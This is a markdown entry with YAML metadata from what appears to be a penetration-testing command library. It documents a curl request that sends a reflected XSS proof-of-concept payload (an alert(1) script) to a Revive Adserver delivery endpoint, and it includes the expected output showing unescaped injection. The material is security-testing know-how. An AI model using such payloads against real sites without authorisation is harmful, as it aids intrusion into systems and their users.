---
data: >-
  curl
  "https://revive-instance/www/delivery/afr.php?refresh=10000&</script><script>alert(1)</script>"
tags:
  - xss
  - poc
  - web-test
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 05570082-2ab8-4272-a4d9-5c83e4390f8b
created_at: '2025-12-14T03:47:13.089Z'
updated_at: '2025-12-14T03:47:13.089Z'
verified: false
validated: true
submitted: true
---
# curl-reflected-xss-poc

## Command

```bash
curl "https://revive-instance/www/delivery/afr.php?refresh=10000&</script><script>alert(1)</script>"
```

## Description

This command sends an HTTP GET request to the Revive Adserver endpoint with a reflected XSS payload in the 'refresh' parameter, allowing testers to fetch and inspect the response for unescaped JavaScript injection without rendering it in a browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Full target URL with payload in query string | Yes |

## Examples

### Basic Usage

```bash
curl "https://revive-instance/www/delivery/afr.php?refresh=10000&</script><script>alert(1)</script>"
```

### Advanced Usage

```bash
curl -v "https://revive-instance/www/delivery/afr.php?refresh=10000&</script><script>alert(1)</script>" | grep -i script
```

## Expected Output

HTML response containing the reflected payload in a script tag, such as: setTimeout('window.location.replace("https://revive-instance/www/delivery/afr.php?refresh=10000&</script><script>alert(1)</script>&loc=")', 10000000); indicating successful injection.

## Related

- [[Related Procedure: Craft-Basic-XSS-Payload-with-curl]]
